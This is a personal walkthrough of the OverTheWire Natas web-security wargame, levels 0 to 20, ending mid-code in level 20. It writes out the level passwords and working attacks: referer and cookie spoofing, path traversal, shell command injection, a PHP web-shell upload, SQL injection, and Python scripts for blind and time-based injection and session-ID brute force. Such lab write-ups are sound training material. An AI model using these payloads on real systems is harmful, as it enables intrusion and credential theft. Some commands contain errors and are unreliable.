# Natas walkthrough

### For serverside web security.

[SQL injection payloads](https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b)

Submitting on wechall:
`WECHALLUSER="username" WECHALLTOKEN="token" wechall`

Initial: 

Username: natas0
Password: natas0
URL: http://natas0.natas.labs.overthewire.org

# Level 0

URL: http://natas0.natas.labs.overthewire.org/

A simple view page source gave the password.

Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

# Level 1

URL: http://natas1.natas.labs.overthewire.org/

Even though rightclicking was blocked, F12 gave away the result.

Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

# Level 2

## Hidden file directory

URL: http://natas2.natas.labs.overthewire.org/

There is nothing in the page, except one pixel wide image. Not of much interest. But the link of that image is `files/image.png`. Firing a URL to view this `files` directory comes up with more code, with somewhere a `users.txt`. The contents are as below.

```s
#### username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

# Level 3

## Of robots.txt

URL: http://natas3.natas.labs.overthewire.org/

Viewing the page source gave a hint: not even Google will find this time. What prevents Google from finding anything? robots.txt. Firing in `http://natas3.natas.labs.overthewire.org/robots.txt` gave the:

```s
User-agent: *
Disallow: /s3cr3t/
```
Firing `http://natas3.natas.labs.overthewire.org/robots.txts3cr3t/` gave the directory's index with a txt file.

natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

# Level 4

## Changing source of HTTP request

URL: http://natas4.natas.labs.overthewire.org/

The page on being visited says something on the lines you are coming from xyz, access granted to only `http://natas5.natas.labs.overthewire.org/`.

Quite evidently, accessing this page as if it was being accessed from `http://natas5.natas.labs.overthewire.org/` does the trick. When thinking about such, refer to `HTTP headers`. The useful header to use is the `HTTP referer URL`, that spoofs the source to be something else.

Simply fire from terminal: 

```s
wget http://natas4.natas.labs.overthewire.org/ --http-user=natas4 --http-password=Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer=http://natas5.natas.labs.overthewire.org/
```

where `--http-user` and `--http-password` serve to authenticate the page. This downloads a file `index.html`. Open that and you shall get the password.

Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

#### (This level may also be solved using a Burp proxy).

# Level 5

## Changing login information (or manipulating cookies)

#### Cookies are small pieces of data stored by the web server on the user's computer that store stateful information as the login status, history, browsing activity, bookmarks, and so on. The most important feature is to store user's login information (recall Remember Me checkbox when signing in).


URL: http://natas5.natas.labs.overthewire.org/

The initial page says that access is denied since you are not logged in. So what stores information about the logged in status? Try seeing the server response:

```s
wget http://natas5.natas.labs.overthewire.org/ --user=natas5 --password=iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --server-response
``` 
The following information pops up.

```s
--2020-07-05 21:13:35--  http://natas5.natas.labs.overthewire.org/
Resolving natas5.natas.labs.overthewire.org (natas5.natas.labs.overthewire.org)... 176.9.9.172
Connecting to natas5.natas.labs.overthewire.org (natas5.natas.labs.overthewire.org)|176.9.9.172|:80... connected.
HTTP request sent, awaiting response... 
  HTTP/1.1 401 Unauthorized
  Date: Sun, 05 Jul 2020 15:41:36 GMT
  Server: Apache/2.4.10 (Debian)
  WWW-Authenticate: Basic realm="Authentication required"
  Content-Length: 480
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=iso-8859-1
Authentication selected: Basic realm="Authentication required"
Reusing existing connection to natas5.natas.labs.overthewire.org:80.
HTTP request sent, awaiting response... 
  HTTP/1.1 200 OK
  Date: Sun, 05 Jul 2020 15:41:36 GMT
  Server: Apache/2.4.10 (Debian)
  Set-Cookie: loggedin=0 ############################################ <-- THIS
  Vary: Accept-Encoding
  Content-Length: 855
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8
Length: 855 [text/html]
Saving to: ‘index.html’

index.html             100%[=========================>]     855  --.-KB/s    in 0s      

2020-07-05 21:13:36 (50.0 MB/s) - ‘index.html’ saved [855/855]
```

Note a cookie storing information `Set-Cookie: loggedin=0`. We need to change this. 

```s
wget http://natas5.natas.labs.overthewire.org/ --user=natas5 --password=iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --server-response --header "Cookie: loggedin=1" 
```

This downloads a file named index.html.1. Open that to your delight.

Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

# Level 6

## Forms

URL: http://natas6.natas.labs.overthewire.org/

The URL contains a form and a source-code of the form. Opening the source code gives that a variable `'secret'` contains the secret that goes past the form. There is no information of this secret, except the fact of some `include "includes/secret.inc"`. Open the URL `http://natas6.natas.labs.overthewire.org/includes/secret.inc` gives a blank page. Still, open the source code and a variable secret is there.

Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

# Level 7

## [Query String](https://en.wikipedia.org/wiki/Query_string)

#### A query string within a URL specifies values of parameters that manipulate search. Usually given after a ? towards the end of the URL.

URL: http://natas7.natas.labs.overthewire.org/

Upon opening the webpage, you will find the hint that the password is in /etc/natas_webpass/natas8 as well as the following `index.php?page=home` and `index.php?page=about`. Simply do a `index.php?page=/etc/natas_webpass/natas8` to open the hidden page with the password. In this example, the query parameter `page` needs to be set to the page being requested.

Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

# Level 8

## Basic PHP scripting

URL: http://natas8.natas.labs.overthewire.org/

The following PHP function was guarding the access:

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

A simple reverse of the function does the trick.

```php
<?
function decode_secret($secret){
    return base64_decode(strrev(hex2bin($secret)))
}

echo decode_secret("3d3d516343746d4d6d6c315669563362");
?>
```

Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

# Level 9

## Why passthru() is NOT secure?

#### passthru() is a PHP method allowing to execute commands. It is not considered secure anywhere.

URL: http://natas9.natas.labs.overthewire.org/

The code obtained:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The point is that `passthru` is not validating what is going within it. We abuse this by sending in:

```s
grep -i [A-Za-z0-9] * dictionary.txt
```

A more thoughtful search of the form:

```s
grep -i [A-Za-z0-9] /etc/natas_webpass_natas10 dictionary.txt
```

does the trick. It is also absused in the following way:

```s
grep -i ;ls -la; dictionary.txt
grep -i ;ps -el; dictionary.txt
```

Everything runs.

Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

# Level 10

## passthru() is still not secure.

URL: http://natas10.natas.labs.overthewire.org/

This time the code is modified as:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Note the `/[;|&]/` regex that is filtered out. However, there is no restriction on using `[]`. Thus, we do 

```s
grep -i [A-Za-z0-9] /etc/natas_webpass/natas11 dictionary.txt
```

evades the filter.

Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

# Level 11

## Reverse engineering XOR cipher

#### Read more about XOR cipher [here](https://en.wikipedia.org/wiki/XOR_cipher). The thing to note is XOR ciphers are open to known-plaintext attacks. Thus, plaintext XOR ciphertext = key.

URL: http://natas11.natas.labs.overthewire.org/

Given the PHP code for XOR encryption:

```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```

and the following series of steps:

```php
setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
```

The application tests is `show_password = yes` in `$d = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`.

Thus, using the plaintext attack, we first get the ciphertext from 

```s
wget http://natas11.natas.labs.overthewire.org/ --user=natas11 --password=U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK --server-response
```
Ciphertext is the base 64 decoded version of the cookie value `Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D`.

Now writing a function:

```php
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

xor_encrypt(base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D'));
```

This gives the key as repetitions of `qw8J`. Have sufficient repetitions to make sure no out of bounds comes for `$key[$i % ...]`. Now update the function,

```php
function xor_encrypt($in) {
    $key = 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

new_cookie_value = base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))))

```

and finally call

```s
wget http://natas11.natas.labs.overthewire.org/ --user=natas11 --password=U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK --server-response --header = new_cookie_value
```

Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

# Level 12 

## Intercepting and changing webpage logic

URL: http://natas12.natas.labs.overthewire.org/

The following code comes up.

```php
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

It may seem by `$ext = pathinfo($fn, PATHINFO_EXTENSION);` that any file of the name `*.jpg.php` will not only be uploaded but also be uploaded as a valid php file. However, notice that the statement responsible for calling the above statement is `$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);` which captures `$_POST["filename"]`. Now when we search for `filename`, we obtain the statement 

```php
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```

which forces the filename to be a `jpg`. Evidently, any file of the form `*.jpg.php` gets uploaded as a random `jpg`. To overcome this, open `inspect element` and change this line to:

```php
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.php" />
```

Now create a file `index.jpg.php` with the following code:

```php
<html>
<head>
<title>Online PHP Script Execution</title>
</head>
<body>
<?php
  echo "Hello\n";
  echo passthru("cat /etc/natas_webpass/natas13");
  echo "\n";
?>
</body>
</html>
```

Upload the file. It will be uploaded as a valid php file and the link shall be given back to you. Visit the link to get the password.


Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

#### Alternatively, use Burp to intercept traffic and change this particular fact.

# Level 13

## Bypassing checks on image signatures

URL: http://natas13.natas.labs.overthewire.org/

This time is similar to last time with one improvement.

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image"; 
```

So how does `exif_imagetype` works? From [this](https://www.php.net/manual/en/function.exif-imagetype.php) link, it is clear that it reads the first bytes of an image and checks its signature. The magic bytes are `\xff\xd8\xff\xe0`. Thus simply do,

```s
cat \xff\xd8\xff\xe0 > text
```

Create `file.php` such that.

```php
<?
echo passthru('cat /etc/natas_webpass/natas14')
?>
```

Do 

```s
cat text file.php > file1.php
```

Fire up inspect element and change the following

```php
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```

to

```php
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.php" />
```

Upload. Open the link. And you have the password.

Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

# Level 14

URL: http://natas14.natas.labs.overthewire.org/

The following SQL query is in place

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

A simple SQL injection of the form `" or 1 = 1 #` in the `username` returns always true while commenting out all the other part of the query.

Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

# Level 15

## Blind SQL injection

URL: http://natas15.natas.labs.overthewire.org/

Redo this one later. Allows only usernames and thus you need to construct the password one character at a time.

```py
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    if 'exists' in r.text :
        filtered = filtered + char

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break

```

Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

# Level 16

## Command substitution and boolean injection

URL: http://natas16.natas.labs.overthewire.org/

This level is similar to level 9 and level 10 except for the fact that:

```php
passthru("grep -i \"$key\" dictionary.txt");
```

The `\"` before and after the `$key` changes everything. One thing to attack this is command substitution. Consider the following brute force:

```python
import requests
from requests.auth import HTTPBasicAuth

auth_username = 'natas16'
auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
word_list = []
password_list = [""]
numeral_list = ["0", "1", "2", "3" ,"4", "5", "6", "7", "8", "9"]
def brute_force_positions():
    for i in range(1, 33):

        payload = '$(cut -c' + str(i) +' /etc/natas_webpass/natas17)'
        response = requests.post('http://natas16.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data = {'needle': payload})
        response_text = response.text
        response_text_start_index = response_text.index("<pre>")
        response_text = response_text[response_text_start_index + 5:]
        response_text_end_index = response_text.index("</pre>")
        response_text = response_text[0:response_text_end_index]
        line_split = response_text.split("\n")
        captured_line = ""
        for line in line_split:
            if(len(line) == 1):
                captured_line = line
                word_list.append(line)
                print(line)

        if(captured_line == ""):
            word_list.append("numeral")
            print("numeral")

def modified_queries():
    payload = '$(cut -c2 /etc/natas_webpass/natas17)'
    response = requests.post('http://natas16.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data = {'needle': payload})
    print(response.text)

def create_password_list():
    global word_list
    global password_list
    global numeral_list
    index = 1
    for word in word_list:
        print(index)
        index = index + 1
        if(word == "numeral"):
            new_list = []
            for password in password_list:
                for numeral in numeral_list:
                    new_list.append(password + numeral)
        else:
            upper = word.upper()
            lower = word.lower()
            new_list = []
            for password in password_list:
                new_list.append(password + upper)
                new_list.append(password + lower)
        password_list = list(new_list)
        del(new_list)
    
    file_object = open("passwords_natas17.txt", "w")
    file_object.write(password_list)
    file_object.close()


brute_force_positions()
create_password_list()
```
The substitution occues in `payload = '$(cut -c2 /etc/natas_webpass/natas17)'`. However, brute force is huge. Then we move on to [boolean based injection](https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/) in the way that the query prints something on true and nothing on false. Amazing [walkthrough](https://www.abatchy.com/2016/11/natas-level-16).

Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

# Level 17

URL: http://natas17.natas.labs.overthewire.org/

## 

### Questions:

#### Can something be done about the PHP code?

No. It is server side.

#### Observe responses of correct and incorrect queries?

No difference. Everything seems same.

#### What about time???

Consider the SLEEP() [SQL attack vector](https://blog.pythian.com/mysql-injection-sleep/). 

```py
def analyse_time():
    password = ""
    character_set = "0123456789abcdefghijklmnopqrstuvwxyz"
    for _ in range(32):
        for char in character_set:
            lower = char.lower()
            _payload = {'username' : 'natas18" and if (password LIKE BINARY "'+password+lower+'%", SLEEP(5), 0) #'}
            response = receive_response(_payload)
            response_time = str(response.elapsed)
            dot_index = response_time.index(".")
            response_time = response_time[0:dot_index]
            try:
                last_index = len(response_time)
                response_time_seconds = int(response_time[last_index-1:last_index])
                if(response_time_seconds >= 5):
                    password = password + lower
                    print(password)
            except:
                pass

            upper = char.upper()
            _payload = {'username':'natas18" and if (password LIKE BINARY "'+password+upper+'%", SLEEP(5), 0) #'}
            response = receive_response(_payload)
            response_time = str(response.elapsed)
            dot_index = response_time.index(".")
            response_time = response_time[0:dot_index]
            try:
                last_index = len(response_time)
                response_time_seconds = int(response_time[last_index-1:last_index])
                if(response_time_seconds >= 5):
                    password = password + upper
                    print(password)
            except:
                pass
    print(password)


analyse_time()
```

Looking at the PHP code:

```php
if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    } 
```

All lines are commented out, implying there is no way to know whether the query was successful or not. The only way is to analyse other parts of the response. Here comes the timed SQL injection attack into the scene.

```sql
SELECT * FROM users WHERE username=""
```

If the username is set as `natas18" and password="" and ...`, then the AND logical operator works as if the first condition fails, then the second condition is checked. Our job here is to craft a condition such that the response takes long to return if we got certain condition true.

```sql
{ 'username' : 'natas18" and if (password LIKE BINARY "a%", SLEEP(5), 0) # }
```

Quite simply, if the first character of the password is `a`, then `SLEEP(5)`. For we just brute force our way such that we capture the first character in the password, then the second, and so on.

```py
def analyse_time():
    password = ""
    character_set = "0123456789abcdefghijklmnopqrstuvwxyz"
    for _ in range(32):
        for char in character_set:
            lower = char.lower()
            _payload = {'username' : 'natas18" and if (password LIKE BINARY "'+password+lower+'%", SLEEP(5), 0) #'}
            response = receive_response(_payload)
            response_time = str(response.elapsed)
            dot_index = response_time.index(".")
            response_time = response_time[0:dot_index]
            try:
                last_index = len(response_time)
                response_time_seconds = int(response_time[last_index-1:last_index])
                if(response_time_seconds >= 5):
                    password = password + lower
                    print(password)
            except:
                pass

            upper = char.upper()
            _payload = {'username':'natas18" and if (password LIKE BINARY "'+password+upper+'%", SLEEP(5), 0) #'}
            response = receive_response(_payload)
            response_time = str(response.elapsed)
            dot_index = response_time.index(".")
            response_time = response_time[0:dot_index]
            try:
                last_index = len(response_time)
                response_time_seconds = int(response_time[last_index-1:last_index])
                if(response_time_seconds >= 5):
                    password = password + upper
                    print(password)
            except:
                pass
    print(password)


analyse_time()
```

A better solution is [here](https://www.abatchy.com/2016/12/natas-level-17). It is like taking out the characters which are present in the password and running the above loop only on them. Testing for such characters occurs 

Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

# Level 18

## PHP session hijacking

URL: http://natas18.natas.labs.overthewire.org/

Viewing the source-code, the most interesting portions are:

```php
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}  
```

We have the following information here:

1. Session IDs range from 1 to 640

2. Logging with `admin` and `admin` as username and password won't work (see `isValidAdminLogin()`)

3. Session starts successfully if there is `PHPSESSID` in `$_COOKIE`

4. Credentials are printed if and only if `$_SESSION["admin"] ==1` (and there is no way to set this superglobal value from the client side).

Since we can't set `$_SESSION["admin"] ==1` from the client side, our only attack vector is to impersonate an already taken `PHPSESSID`. One of these would be the admin's. And since `PHPSESSID` is taken from cookies, we hijack the cookies.

Consider the following:

```py
auth_username = 'natas18'

auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

_payload = {'username':'admin', 'password':'admin'}

response = requests.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))

response = requests.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)

response = requests.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
```

The response obtained is:

```s
Please login ....

You are logged in as a regular user ...

Please login
```

while the following code:

```py
sess = requests.Session()

auth_username = 'natas18'

auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

_payload = {'username':'admin', 'password':'admin'}

response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))

response = sess.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)

response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
```

```s
Please login ....

You are logged in as a regular user ...

You are logged in as a regular user ...
```

In the second example, we have cookie persistance because of the opened session. This is our entry into session hijacking.

```py
def session_handling():
    
    sess = requests.Session()

    auth_username = 'natas18'

    auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

    _payload = {'username':'nimish', 'password':'nimish'}
    

    response = sess.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
    
    for i in range(1, 461):
        new_cookie = RequestsCookieJar()

        new_cookie.set(name="PHPSESSID", value=str(i), domain='natas18.natas.labs.overthewire.org', path="/")

        sess.cookies.update(new_cookie)

        response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))

        try:

            response.text.index("are logged in as a regular")

            print(str(i) + " non admin account")
        
        except:
        
            print(str(i) + " admin account ")
        
            print(response.text)
        
            break
```
Quite straightforward, we have a `sess.post()` to let the server give a `PHPSESSID`. We then update our cookie to impersonate all possible IDs. Once we get a response which is not of a regular user, we get the password. I got the break for `PHPSESSID=119`.

Simple `GET` like `.../index.php?PHPSESSID=119` don't work. I guess because the cookies are not modified.

Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

# Level 19

URL: http://natas19.natas.labs.overthewire.org/

This level is similar to the last level, except for the fact that the IDs are not sequential. 

We analyse the way IDs are given:

```py
def analyse_PHPSESSID_generation_procedure():
    auth_username = 'natas19'
    auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
    _payload = {'username':'admin', 'password':'admin'}

    for _ in range(1):
        response = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
        for cookie in response.cookies:
            print(cookie.value)
```

With a few tweaks to the `_payload`, the following facts are observed:

1. The ID is formed of two parts.

2. Suffix is hex coding of the username

3. The prefix takes a number from 1 to 461 and inserts 3 before each character. For 114, 313134

Since we are interested in logging as the admin, `2d61646d696e` becomes the suffix. Now brute force the prefix part.

```py
def brute_force_PHPSESSID():

    sess = requests.Session()
    auth_username = 'natas19'
    auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
    _payload = {'username':'admin', 'password':'admin'}

    response = sess.post('http://natas19.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)    

    for i in range(1, 461):
        length = len(str(i))
        string_i = str(i)
        prefix = ""
        for i in range(length):
            prefix = prefix + "3" + string_i[i]
            
        cookie_value = prefix + "2d61646d696e"
        new_cookie = RequestsCookieJar()
        new_cookie.set(name="PHPSESSID", value=cookie_value, domain='natas19.natas.labs.overthewire.org', path="/")
        sess.cookies.update(new_cookie)
        
        response = sess.get('http://natas19.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
        try:
            response.text.index("are logged in as a regular")
            print(prefix + " 2d61646d696e" + " non admin account: regular user")
        except:
            try:
                response.text.index("Uninitialized string offset:")
                print(prefix + " 2d61646d696e" + " uninitialized")
            except:
                try:
                    response.text.index("login with your admin account to retrieve credentials for")
                    print(prefix + " 2d61646d696e" + " non admin account: homepage")
                except:
                    print(prefix + " 2d61646d696e" + " admin account ")
                    print(response.text)
                    break
```

The strings `non admin account: homepage` and `uninitialized` are from trial and error. Some IDs (like two digit IDs without any 3) give a `Uninitialized string offset:` while others give the normal homepage as `login with your admin account to retrieve credentials for`.

Finally, the password eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF comes out on 323831-2d61646d696e.

# Level 20

## Vulnerable PHP variable connected to form input without escaping/parsing 

URL: http://natas20.natas.labs.overthewire.org/

[`session_set_save_handler()`](http://www.hackingwithphp.com/10/3/7/files-vs-databases)

1. `session_set_save_handler()` has custom functionality for storing data.

2. The name sent as the input form gets stored into the `$_SESSION["name"]`.

3. The variable `$name` gets set to the value of the session variable `$_SESSION["name"]`.

Open the link and type in a few usernames and press submit. Then open `http://natas20.natas.labs.overthewire.org/index.php?debug` to see the debug output.

4. `session_save_path()` (which returns the current working directory to store session data) returns `/var/lib/php5/sessions/`. The final filename is formed by appending `/mysess_$sid`. `$sid` is a kind of session ID to be targeted

The following function 

```php
function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
} 
```

ensures:

1. `$sid` is alphanumeric.

2. Reads from the file, and [serializes](https://www.geeksforgeeks.org/serialize-deserialize-array-string/) the data.

The other function

```php
function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
